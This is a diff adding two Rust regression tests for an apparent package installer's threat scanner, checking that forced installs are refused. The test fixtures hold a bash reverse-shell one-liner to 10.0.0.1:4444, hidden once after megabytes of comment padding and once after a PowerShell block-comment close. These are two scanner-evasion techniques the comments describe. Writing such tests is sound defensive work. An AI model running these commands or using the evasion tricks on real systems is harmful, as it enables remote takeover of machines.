@@ -136,6 +136,46 @@ fn code_after_an_interpreter_line_terminator_is_still_refused() {
 }
 
 #[test]
+fn a_reverse_shell_after_megabytes_of_padding_is_still_refused() {
+    // Regression: the scan read only the first 4 MiB of a file, so this
+    // setup.sh was graded safe and installed without --force.
+    let pad = "# pad\n".repeat(750_000);
+    let script = format!("#!/bin/sh\n{pad}bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n");
+    let home = temp_home();
+    let package = package(home.path(), &[("setup.sh", &script)]);
+    let out = install(home.path(), &package, &["--force"]);
+    assert_eq!(out.status.code(), Some(77), "{}", stderr(&out));
+    assert!(
+        stderr(&out).contains("threat scan verdict dangerous (reverse_shell in setup.sh:750002)"),
+        "{}",
+        stderr(&out)
+    );
+    assert!(!installed(home.path()));
+}
+
+#[test]
+fn code_after_a_powershell_block_comment_closes_is_still_refused() {
+    // Regression: `#>` closes a `<#` block and PowerShell runs the rest of
+    // the line, but the `#` line was lowered as a comment and `--force`
+    // installed a reverse shell.
+    for text in [
+        "<#\n#> Start-Process bash -ArgumentList '-c','bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'\n",
+        "<#\n#> Start-Process bash -ArgumentList -c,bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n",
+    ] {
+        let home = temp_home();
+        let package = package(home.path(), &[("setup.ps1", text)]);
+        let out = install(home.path(), &package, &["--force"]);
+        assert_eq!(out.status.code(), Some(77), "{text}: {}", stderr(&out));
+        assert!(
+            stderr(&out).contains("threat scan verdict dangerous (reverse_shell in setup.ps1:2)"),
+            "{text}: {}",
+            stderr(&out)
+        );
+        assert!(!installed(home.path()), "{text}");
+    }
+}
+
+#[test]
 fn a_caution_verdict_needs_force_and_the_record_keeps_it() {
     // The same shell text in documentation is lowered to caution, but is
     // still reported.
